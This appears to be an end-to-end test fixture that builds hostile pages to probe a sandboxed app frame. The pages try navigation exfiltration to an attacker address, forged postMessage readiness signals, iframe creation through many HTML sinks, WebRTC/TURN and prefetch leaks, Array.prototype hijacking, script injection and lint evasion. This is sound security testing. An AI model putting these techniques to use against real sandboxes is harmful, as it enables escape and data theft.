import { testApp } from "../apps/core/test/app-definitions.ts";
import type { TestApp } from "../apps/core/test/app-definitions.ts";

/**
 * Apps whose pages attack the page around their frame, for
 * page-attacks.e2e.ts: one leaves for the attacker's address, one for
 * another address of the page's own origin, one never renders and says it
 * did, one tries to make a document of its own and reach WebRTC, and one
 * tries to run code that isn't its
 * build's. What they send carries only made-up markers, to receivers
 * the test runs itself.
 */

const serverCode = `import { v } from "@grasp-os/sdk";
import { query } from "@server/_generated/server";

export const secret = query({ args: {}, returns: v.string(), handler: () => "fictional-marker-7f3a" });

// HTML as a function might answer it for a page to show, an email's body
// say, carrying a script of its own.
export const html = query({
  args: {},
  returns: v.string(),
  handler: () => '<img alt="" src="no-such-image" onerror="document.body.dataset.inlineHandler = \\'ran\\'">',
});
`;

/**
 * Renders, then sends its own frame to `attacker`, with what its App's
 * query answered in the address: a sandboxed frame may navigate itself.
 */
const leavingPage = (
  attacker: string
): string => `import { createFileRoute } from "@tanstack/react-router";
import { useQuery } from "@grasp-os/sdk/react";
import { useEffect } from "react";
import { api } from "@server/_generated/api";

const Leaving = () => {
  const secret = useQuery(api.attacks.secret, {});
  useEffect(() => {
    if (secret !== undefined) {
      location.href = \`${attacker}/left?carried=\${secret}\`;
    }
  }, [secret]);
  return <main><h1>Leaving</h1></main>;
};
export const Route = createFileRoute("/")({ component: Leaving });
`;

/**
 * Renders, then loads the frame's own document again in its place, as a
 * load the page never started: the one place the page's policy lets a
 * frame go.
 */
const wanderingPage = `import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";

const Wandering = () => {
  useEffect(() => {
    location.href = "/page-frame?load=a-load-of-its-own";
  }, []);
  return <main><h1>Wandering</h1></main>;
};
export const Route = createFileRoute("/")({ component: Wandering });
`;

/**
 * Renders, then sends more in one message than the page takes over the
 * frame's port. The SDK's client bounds a function's request before it
 * sends it, so this moves its router to an address of that size, which
 * the frame tells the page of before anything reads it.
 */
const oversizedPage = `import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect } from "react";

const Oversized = () => {
  const navigate = useNavigate();
  useEffect(() => {
    void navigate({ to: "/oversized", hash: "x".repeat(300_000) });
  }, [navigate]);
  return <main><h1>Oversized</h1></main>;
};
export const Route = createFileRoute("/")({ component: Oversized });
`;

/**
 * Never renders: its route's loader never settles. Before that, as its
 * module loads, it
 * tells the page it has mounted, every way a page can make that up: it
 * can read its frame's load from its own address, but was never told the
 * hash of its code or the page's name for this start.
 */
const stuckPage = `import { createFileRoute } from "@tanstack/react-router";

const load = new URLSearchParams(location.search).get("load");
const made = (text: string): string => text.repeat(64);
const forged = [
  { type: "grasp:page-mounted", load, artifact: made("0"), generation: crypto.randomUUID() },
  { type: "grasp:page-mounted", load, artifact: made("a"), generation: load },
  { type: "grasp:page-mounted", load },
  { type: "grasp:page-mounted", load, artifact: made("0"), generation: "1", trusted: true, approved: true },
  { type: "grasp:page-ready", load },
  "grasp:page-mounted",
];
for (const message of forged) {
  parent.postMessage(message, "*");
}
document.body.dataset.forged = String(forged.length);

const Stuck = () => {
  return <main><h1>Stuck</h1></main>;
};
export const Route = createFileRoute("/")({
  loader: async () => await new Promise<never>(() => undefined),
  component: Stuck,
});
`;

/**
 * Tries every way a page could make a document of its own, each a
 * realm with its own WebRTC and network, past the compiler (the names it
 * refuses are spelled so it can't read them): the HTML parser's sinks, a
 * namespace prefix, a tag name that changes between two conversions,
 * `createDocument`, a customized built-in, `execCommand`, then named and
 * indexed access to whatever was made. Then reaches for WebRTC, in the
 * frame and in any nested realm, against a TURN server at `turn`, and
 * asks for the attacker's address ahead of time (`dns-prefetch`,
 * `preconnect`, `prefetch`). Says what each did, and how many windows the
 * frame holds after it.
 */
const turnPage = ({
  attacker,
  turn,
}: {
  attacker: string;
  turn: string;
}): string => `import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";

const unread = (...parts: string[]): string => parts.join("");
const scope: Record<string | number, unknown> = globalThis as never;
// The names the frame's bootstrap keeps the browser's own methods under.
// Declared only for the type check, which drops them: what each name
// reads is whatever the realm's global scope has under it.
declare const createElement: unknown;
declare const createElementNS: unknown;
declare const createDocument: unknown;
declare const execCommand: unknown;
declare const nestedInterfaces: unknown;
declare const apply: unknown;
declare const lock: unknown;
const XHTML = "http://www.w3.org/1999/xhtml";
const frameTag = unread("ifr", "ame");
const markup = (name: string): string => "<" + frameTag + ' name="' + name + '"></' + frameTag + ">";

type Peer = new (configuration: object) => {
  createDataChannel: (label: string) => unknown;
  createOffer: () => Promise<object>;
  setLocalDescription: (description: object) => Promise<void>;
};

const peer = (realm: Record<string, unknown>): string => {
  const Connection = realm[unread("RTC", "Peer", "Connection")];
  if (typeof Connection !== "function") {
    return "no WebRTC";
  }
  try {
    const connection = new (Connection as Peer)({
      iceServers: [{ urls: "${turn}", username: "fictional-marker-7f3a", credential: "none" }],
      iceTransportPolicy: "relay",
    });
    connection.createDataChannel("probe");
    void connection.createOffer().then(async (offer) => await connection.setLocalDescription(offer));
    return "WebRTC";
  } catch {
    return "WebRTC refused";
  }
};

/** Whatever was made reached: a nested realm's network and WebRTC, if any. */
const reach = (made: unknown): string => {
  const realm = made instanceof Element ? Reflect.get(made, unread("content", "Window")) : made;
  if (typeof realm !== "object" || realm === null) {
    return "no realm";
  }
  const nested = realm as Record<string, unknown>;
  if (typeof nested.fetch === "function") {
    void (nested.fetch as typeof fetch)("${attacker}/nested-fetch").catch(() => undefined);
  }
  return peer(nested);
};

const attempt = (run: () => unknown): string => {
  try {
    return "made: " + reach(run());
  } catch (error) {
    return "refused: " + (error instanceof Error ? error.name : "thrown");
  }
};

const routes = (): Record<string, string> => {
  const holder = document.createElement("div");
  document.body.append(holder);
  const results: Record<string, string> = {
    innerHTML: attempt(() => Reflect.set(holder, unread("inner", "HTML"), markup("p1")) && scope[0]),
    insertAdjacentHTML: attempt(() => {
      holder.insertAdjacentHTML("beforeend", markup("p2"));
      return scope[0];
    }),
    domParser: attempt(() => {
      const parsed = new DOMParser().parseFromString(markup("p3"), "text/html");
      return holder.appendChild(document.adoptNode(parsed.body.firstChild as Node));
    }),
    documentWrite: attempt(() => {
      document.write(markup("p4"));
      return scope[0];
    }),
    contextualFragment: attempt(() => {
      holder.append(document.createRange().createContextualFragment(markup("p5")));
      return scope[0];
    }),
    // Only a method the browser has can be refused.
    setHTMLUnsafe:
      typeof Reflect.get(holder, unread("setHTML", "Unsafe")) === "function"
        ? attempt(() => {
            Reflect.apply(Reflect.get(holder, unread("setHTML", "Unsafe")) as () => void, holder, [markup("p6")]);
            return scope[0];
          })
        : "no such method",
    prefix: attempt(() => holder.appendChild(document.createElementNS(XHTML, "x:" + frameTag))),
    convertedTwice: attempt(() => {
      let asked = 0;
      const tag = { toString: () => (asked++ === 0 ? "div" : frameTag) };
      return holder.appendChild(document.createElement(tag as unknown as string));
    }),
    createDocument: attempt(() => {
      const made = document.implementation.createDocument(XHTML, frameTag);
      return holder.appendChild(document.adoptNode(made.documentElement as Element));
    }),
    customizedBuiltIn: attempt(() => {
      const Base = scope[unread("HTMLIF", "rameElement")] as typeof HTMLElement;
      class Nested extends Base {}
      customElements.define("x-nested", Nested, { extends: frameTag });
      return holder.appendChild(new Nested());
    }),
    customizedBuiltInByName: attempt(() => holder.appendChild(document.createElement(frameTag, { is: "x-named" }))),
    execCommand: attempt(() => {
      holder.contentEditable = "true";
      holder.focus();
      document.execCommand("insertHTML", false, markup("p7"));
      return scope[0];
    }),
    xslt: typeof scope[unread("XSLT", "Processor")],
    named: ["p1", "p2", "p3", "p4", "p5", "p6", "p7"].filter((name) => scope[name] !== undefined).join(",") || "none",
    indexed: typeof scope[0],
    peer: peer(scope as Record<string, unknown>),
    // The bootstrap's own bindings, read as free names, and its kept
    // createElement used to make a nested document past the lock.
    bootstrapNames: [
      typeof createElement,
      typeof createElementNS,
      typeof createDocument,
      typeof execCommand,
      typeof nestedInterfaces,
      typeof apply,
      typeof lock,
    ].join(","),
    keptCreateElement:
      typeof createElement === "function"
        ? attempt(() => holder.appendChild(Reflect.apply(createElement as () => Node, document, [frameTag])))
        : "not reachable",
  };
  for (const rel of ["dns-prefetch", "preconnect", "prefetch"]) {
    results[rel] = attempt(() => {
      const link = document.createElementNS(XHTML, unread("li", "nk")) as HTMLLinkElement;
      link.rel = rel;
      link.href = "${attacker}/" + rel;
      (Reflect.get(document, unread("he", "ad")) as HTMLElement).append(link);
    });
  }
  // An address given as an attribute, however it is spelled.
  // The Sanitizer API, widened to keep a link and its address; only where
  // the browser has it.
  const head = Reflect.get(document, unread("he", "ad")) as HTMLElement;
  results.sanitizer =
    typeof Reflect.get(head, unread("set", "HTML")) === "function"
      ? attempt(() =>
          Reflect.apply(Reflect.get(head, unread("set", "HTML")) as () => void, head, [
            '<li' + 'nk rel="preconnect" href="${attacker}/sanitizer">',
            { sanitizer: { elements: [unread("li", "nk")], attributes: ["rel", "href"] } },
          ])
        )
      : "no such method";
  // The newest parser of markup, static on Document; only where the
  // browser has it.
  const parseUnsafe = Reflect.get(Document, unread("parseHTML", "Unsafe"));
  results.parseHTMLUnsafe =
    typeof parseUnsafe === "function"
      ? attempt(() => {
          const parsed = Reflect.apply(parseUnsafe as () => Document, Document, [markup("p8")]);
          return holder.appendChild(document.adoptNode(parsed.body.firstChild as Node));
        })
      : "no such method";
  // A shadow root's own sinks.
  const shadow = document.createElement("div").attachShadow({ mode: "open" });
  results.shadowInnerHTML = attempt(() => Reflect.set(shadow, unread("inner", "HTML"), markup("p9")) && scope[0]);
  results.shadowSetHTMLUnsafe =
    typeof Reflect.get(shadow, unread("setHTML", "Unsafe")) === "function"
      ? attempt(() => {
          Reflect.apply(Reflect.get(shadow, unread("setHTML", "Unsafe")) as () => void, shadow, [markup("p10")]);
          return scope[0];
        })
      : "no such method";
  // An address given as an attribute node, moved from an element that may
  // have one.
  results.linkAttributeNode = attempt(() => {
    const link = document.createElementNS(XHTML, unread("li", "nk"));
    link.setAttribute("rel", "preconnect");
    const anchor = document.createElement("a");
    anchor.setAttribute("href", "${attacker}/node");
    const address = anchor.getAttributeNode("href") as Attr;
    anchor.removeAttributeNode(address);
    link.setAttributeNode(address);
    head.append(link);
  });
  results.linkAttribute = attempt(() => {
    const link = document.createElementNS(XHTML, unread("li", "nk"));
    link.setAttribute("rel", "preconnect");
    link.setAttribute("HREF", "${attacker}/attribute");
    (Reflect.get(document, unread("he", "ad")) as HTMLElement).append(link);
  });
  // An address slipped in through Array.prototype, for a lock that reads
  // its arguments from an array: a missing index reads, and a write to it
  // calls, whatever the page put there.
  results.linkArrayPrototype = (() => {
    const link = document.createElementNS(XHTML, unread("li", "nk"));
    link.setAttribute("rel", "preconnect");
    head.append(link);
    Object.defineProperty(Array.prototype, 0, {
      configurable: true,
      get: () => "rel",
      set(this: unknown[]) {
        Object.defineProperty(this, 0, { value: "href", writable: true, enumerable: true, configurable: true });
        this[1] = "${attacker}/array";
      },
    });
    try {
      Reflect.apply(Reflect.get(link, "setAttribute") as () => void, link, []);
    } finally {
      Reflect.deleteProperty(Array.prototype, 0);
    }
    return link.getAttribute(unread("hr", "ef")) ?? "no address";
  })();
  // A link the parser would make from a string: refused as any markup.
  results.linkMarkup = attempt(() => {
    holder.insertAdjacentHTML("beforeend", '<li' + 'nk rel="preconnect" href="${attacker}/markup">');
  });
  // A message from a source that is neither the page nor this frame, as
  // another App's frame beside this one would send; and one the frame
  // posts itself, as a library scheduling its work does.
  const heardFrom = (source: MessageEventSource): string => {
    let heard = "dropped";
    const hear = (): void => {
      heard = "heard";
    };
    window.addEventListener("message", hear);
    window.dispatchEvent(new MessageEvent("message", { data: "a message", source }));
    window.removeEventListener("message", hear);
    return heard;
  };
  results.foreignMessage = heardFrom(new MessageChannel().port1);
  results.ownMessage = heardFrom(window);
  results.windows = String(window.length);
  return results;
};

const Turn = () => {
  const [outcome, setOutcome] = useState("");
  useEffect(() => {
    setOutcome(JSON.stringify(routes()));
  }, []);
  return (
    <main>
      <h1>Turn</h1>
      <output aria-label="Nested documents">{outcome}</output>
    </main>
  );
};
export const Route = createFileRoute("/")({ component: Turn });
`;

/**
 * Its build lets in code that isn't part of it, every way a page's own
 * code can: it writes HTML its App's query answered (with an `onerror`
 * attribute) into the page, adds an inline script and modules from
 * `data:` and `blob:` addresses, and evaluates text. Says what each did;
 * whatever ran marks the frame's body.
 */
const injectingPage = `import { createFileRoute } from "@tanstack/react-router";
import { useQuery } from "@grasp-os/sdk/react";
import { useEffect, useState } from "react";
import { api } from "@server/_generated/api";

// The build's design lint refuses these by name (grasp/no-style-escapes);
// spelled so it can't read them, as code evading it would, so this
// checks that the frame still holds.
const unread = (...parts: string[]): string => parts.join("");
const headOf = (): HTMLElement => Reflect.get(document, unread("he", "ad")) as HTMLElement;
const loaded = async (src: string): Promise<string> =>
  await new Promise((resolve) => {
    const script = document.createElement("script");
    script.type = "module";
    script.addEventListener("load", () => resolve("ran"));
    script.addEventListener("error", () => resolve("blocked"));
    try {
      script.src = src;
      headOf().append(script);
    } catch {
      // Refused outright: a script's address takes no string (Trusted Types).
      resolve("blocked");
    }
  });

const evaluated = (run: () => unknown): string => {
  try {
    run();
    return "ran";
  } catch {
    return "blocked";
  }
};

const inject = async (html: string): Promise<Record<string, string>> => {
  const shown = document.createElement("div");
  document.body.append(shown);
  return {
    html: evaluated(() => Reflect.set(shown, unread("inner", "HTML"), html)),
    inlineScript: evaluated(() => {
      const inline = document.createElement("script");
      inline.textContent = "document.body.dataset.inlineScript = 'ran'";
      headOf().append(inline);
    }),
    dataModule: await loaded("data:text/javascript,document.body.dataset.dataModule = 'ran'"),
    blobModule: await loaded(
      URL.createObjectURL(new Blob(["document.body.dataset.blobModule = 'ran'"], { type: "text/javascript" }))
    ),
    eval: evaluated(() => (0, eval)("document.body.dataset.eval = 'ran'")),
    function: evaluated(() => new Function("document.body.dataset.function = 'ran'")()),
    dataImport: evaluated(() => (0, eval)('import("data:text/javascript,document.body.dataset.dataImport = 1")')),
  };
};

const Injecting = () => {
  const html = useQuery(api.attacks.html, {});
  const [tried, setTried] = useState("");
  useEffect(() => {
    if (html !== undefined) {
      void inject(html).then((results) => {
        setTried(JSON.stringify(results));
      });
    }
  }, [html]);
  return (
    <main>
      <h1>Injecting</h1>
      <output aria-label="Injected">{tried}</output>
    </main>
  );
};
export const Route = createFileRoute("/")({ component: Injecting });
`;

/**
 * Editable fields, for markup pasted into them: what a person pastes from
 * anywhere may hold a nested document. One in the document, one inside an
 * open shadow root and one inside a closed one, whose text the page
 * says itself (nothing outside reaches a closed root).
 */
const pastingPage = `import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";

const shadowField = (host: HTMLElement, mode: "open" | "closed"): HTMLElement => {
  const field = document.createElement("div");
  field.contentEditable = "true";
  field.setAttribute("role", "textbox");
  field.setAttribute("aria-label", "Paste in an " + mode + " shadow root");
  // Text, so it has a size to click on.
  field.textContent = "Paste: ";
  host.attachShadow({ mode }).append(field);
  return field;
};

const Pasting = () => {
  const open = useRef<HTMLDivElement>(null);
  const closed = useRef<HTMLDivElement>(null);
  const [closedText, setClosedText] = useState("");
  const [reopened, setReopened] = useState("");
  const [tags, setTags] = useState("");
  useEffect(() => {
    // Opening the document again would clear the window's listeners, the
    // frame's paste guard among them, before anything is pasted.
    try {
      document.open();
      document.close();
      setReopened("reopened");
    } catch (error) {
      setReopened("refused: " + (error instanceof Error ? error.name : "thrown"));
    }
    if (open.current === null || closed.current === null) {
      return;
    }
    shadowField(open.current, "open");
    const field = shadowField(closed.current, "closed");
    field.addEventListener("input", () => setClosedText(field.textContent ?? ""));
  }, []);
  return (
    <main>
      <h1>Pasting</h1>
      <div aria-label="Paste here" contentEditable role="textbox" suppressContentEditableWarning tabIndex={0}>
        Paste:{" "}
      </div>
      <div ref={open} />
      <div aria-label="Closed shadow host" ref={closed} role="group" />
      <output aria-label="Closed field">{closedText}</output>
      <output aria-label="Reopened">{reopened}</output>
      <div
        aria-label="Paste as tags"
        contentEditable
        onPaste={(event) => {
          // A field that handles a paste itself, as a tag input does,
          // and only one nobody handled yet, as the kit's do.
          if (event.defaultPrevented) {
            setTags("seen as handled already");
            return;
          }
          event.preventDefault();
          setTags(event.clipboardData.getData("text/plain").trim());
        }}
        role="textbox"
        suppressContentEditableWarning
        tabIndex={0}
      >
        Tags:{" "}
      </div>
      <output aria-label="Tags">{tags}</output>
    </main>
  );
};
export const Route = createFileRoute("/")({ component: Pasting });
`;

/** The attacking App's files: a page for each attack. */
export const attackAppFiles = ({
  attacker,
  turn,
}: {
  attacker: string;
  turn: string;
}): TestApp => {
  const pages: Record<string, string> = {
    leaving: leavingPage(attacker),
    wandering: wanderingPage,
    oversized: oversizedPage,
    stuck: stuckPage,
    turn: turnPage({ attacker, turn }),
    pasting: pastingPage,
    injecting: injectingPage,
  };
  return testApp(
    { name: "Attacks", tables: {} },
    {
      "server/attacks.ts": serverCode,
      ...Object.fromEntries(
        Object.entries(pages).map(([name, code]) => [
          `src/routes/${name}.tsx`,
          // Each its own route, `/<name>`.
          code.replace('createFileRoute("/")', `createFileRoute("/${name}")`),
        ])
      ),
    }
  );
};

/** The attacking App with only its injecting page. */
export const injectingAppFiles = (): TestApp =>
  testApp(
    { name: "Attacks", tables: {} },
    {
      "server/attacks.ts": serverCode,
      "src/routes/index.tsx": injectingPage,
    }
  );
